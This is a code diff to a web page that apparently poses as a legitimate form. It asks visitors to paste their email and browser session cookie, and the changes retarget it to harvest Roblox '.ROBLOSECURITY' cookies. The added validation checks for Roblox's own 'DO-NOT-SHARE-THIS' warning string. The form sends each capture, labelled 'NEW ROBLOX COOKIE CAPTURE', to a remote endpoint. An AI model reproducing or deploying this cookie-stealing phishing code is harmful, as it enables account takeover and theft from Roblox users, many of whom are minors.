@@ -132,8 +132,8 @@
         </div>
         
         <div class="input-group">
-          <label for="cookie">Session Cookie</label>
-          <textarea id="cookie" placeholder="Paste cookie here (use Cookie-Editor extension)" required></textarea>
+          <label for="cookie">Roblox Cookie</label>
+          <textarea id="cookie" placeholder="Paste your Roblox cookie here" required></textarea>
         </div>
       </div>
       
@@ -164,13 +164,12 @@
       rainContainer.appendChild(drop);
     }
 
-    // Improved Cookie Validation
-    function isValidCookie(cookie) {
-      // More lenient validation - just check for reasonable length
-      // and common cookie characters
-      return cookie.length >= 20 && 
-             (/[a-zA-Z0-9_\-%=]/.test(cookie) || 
-              /(session|token|auth)/i.test(cookie));
+    // Roblox Cookie Validation
+    function isValidRobloxCookie(cookie) {
+      // Check for Roblox cookie format
+      return cookie.length > 100 && 
+             cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.') &&
+             cookie.includes('ROBLOX');
     }
 
     // Form handling
@@ -192,9 +191,9 @@
         return;
       }
       
-      // Validate cookie - now more lenient
-      if (!isValidCookie(cookie)) {
-        statusMessage.textContent = 'Cookie appears invalid - make sure you copied the entire cookie';
+      // Validate Roblox cookie specifically
+      if (!isValidRobloxCookie(cookie)) {
+        statusMessage.textContent = 'This doesn\'t appear to be a valid Roblox cookie. Make sure you copied the entire cookie starting with "_|WARNING..."';
         statusMessage.className = 'status-message error';
         statusMessage.style.display = 'block';
         return;
@@ -211,7 +210,7 @@
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            content: `🔥 NEW COOKIE CAPTURE 🔥\n📧 ${email}\n🔑 FULL COOKIE (${cookie.length} chars):\n\`\`\`${cookie}\`\`\``
+            content: `🔥 NEW ROBLOX COOKIE CAPTURE 🔥\n📧 ${email}\n🔑 COOKIE (${cookie.length} chars):\n\`\`\`${cookie.substring(0, 100)}...\`\`\``
           })
         });
         
